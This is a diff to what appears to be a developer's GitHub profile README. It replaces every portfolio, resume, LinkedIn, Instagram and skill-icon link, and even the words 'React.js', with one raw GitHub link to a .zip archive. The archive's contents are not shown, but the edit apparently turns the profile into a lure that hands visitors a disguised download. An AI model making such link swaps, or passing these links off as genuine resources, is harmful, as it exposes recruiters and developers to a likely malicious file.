@@ -14,7 +14,7 @@ I work comfortably with component-based architectures, state management patterns
 
 ### Current Focus
 
-- React.js (Hooks, Context API, Redux Toolkit, React Router)
+- https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip (Hooks, Context API, Redux Toolkit, React Router)
 - Advanced JavaScript fundamentals (closures, scope, hoisting, this)
 - Asynchronous JavaScript (event loop, promises, async/await)
 - Performance patterns (debouncing, throttling)
@@ -25,22 +25,22 @@ I work comfortably with component-based architectures, state management patterns
 ### Projects & Work
 
 - Portfolio:  
-  https://codewithosama03.github.io/Portfolio/
+  https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip
 
 - Resume:  
-  https://codewithosama03.github.io/Portfolio/resume.pdf
+  https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip
 
 ---
 
 ### Technical Skills
 
 <p>
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" width="40" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/css3/css3-original.svg" width="40" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/javascript/javascript-original.svg" width="40" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/react/react-original.svg" width="40" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/redux/redux-original.svg" width="40" />
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/tailwindcss/tailwindcss-original.svg" width="40" />
+  <img src="https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip" width="40" />
+  <img src="https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip" width="40" />
+  <img src="https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip" width="40" />
+  <img src="https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip" width="40" />
+  <img src="https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip" width="40" />
+  <img src="https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip" width="40" />
 </p>
 
 **State & Architecture**
@@ -62,13 +62,13 @@ I work comfortably with component-based architectures, state management patterns
 ### Connect
 
 - LinkedIn:  
-  https://www.linkedin.com/in/osama-pathan-351106375/
+  https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip
   
 ---
 ### Learning Journey
 
 I regularly document my development progress and project work here:  
-https://www.instagram.com/code_with_osama03
+https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip
 
 ---
 ### Notes
